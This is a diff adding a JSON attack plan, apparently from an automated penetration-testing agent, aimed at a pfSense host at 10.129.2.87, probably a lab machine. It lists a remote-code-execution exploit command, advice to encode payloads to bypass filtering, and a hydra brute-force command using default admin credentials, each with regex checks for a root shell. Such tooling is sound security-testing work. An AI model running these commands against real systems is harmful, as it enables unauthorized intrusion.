@@ -1,0 +1,83 @@
+{
+  "plan_id": "plan_20241228_001",
+  "target_ip": "10.129.2.87",
+  "context_hash": "pfsense_lighttpd_unpatched_expired_cert",
+  "attack_vectors": [
+    {
+      "vector_id": "vec_01",
+      "priority": 1,
+      "action": {
+        "tool_name": "web_exploit",
+        "command_template": "python3 exploits/pfsense_rce.py --target {target} --port {port}",
+        "parameters": {
+          "target": "10.129.2.87",
+          "port": 443
+        },
+        "timeout_seconds": 60
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "RCE",
+          "mitre_id": "T1190",
+          "cve_id": "TBD"
+        },
+        "hypothesis": {
+          "confidence_score": 0.75,
+          "rationale_tags": [
+            "pfsense_target",
+            "expired_ssl_cert",
+            "unpatched_vulnerabilities",
+            "poor_maintenance"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "regex_match",
+          "match_pattern": "(root@|#\\s*$|uid=0|shell|command executed)",
+          "negative_pattern": "(login failed|access denied|404 not found)"
+        }
+      },
+      "rag_context": {
+        "payload_snippet": "modify public exploits to bypass strict filtering",
+        "insight": "pfsense systems often require exploit modification for successful execution",
+        "exploitation_logic": "bypass filtering mechanisms through payload encoding and alternative methods",
+        "vulnerability_context": "unpatched vulnerability confirmed via changelog access",
+        "source": "memory_warnings_pfsense_exploitation"
+      }
+    },
+    {
+      "vector_id": "vec_02",
+      "priority": 2,
+      "action": {
+        "tool_name": "credential_attack",
+        "command_template": "hydra -l admin -p pfsense {target} https-form-post",
+        "parameters": {
+          "target": "10.129.2.87"
+        },
+        "timeout_seconds": 30
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "Authentication Bypass",
+          "mitre_id": "T1110",
+          "cve_id": "N/A"
+        },
+        "hypothesis": {
+          "confidence_score": 0.6,
+          "rationale_tags": [
+            "default_credentials",
+            "poor_maintenance",
+            "pfsense_admin"
+          ],
+          "expected_success": false
+        },
+        "success_criteria": {
+          "match_type": "regex_match",
+          "match_pattern": "(login successful|authenticated|dashboard)",
+          "negative_pattern": "(login failed|invalid credentials|blocked)"
+        }
+      }
+    }
+  ],
+  "created_at": "2024-12-28T10:30:00Z"
+}
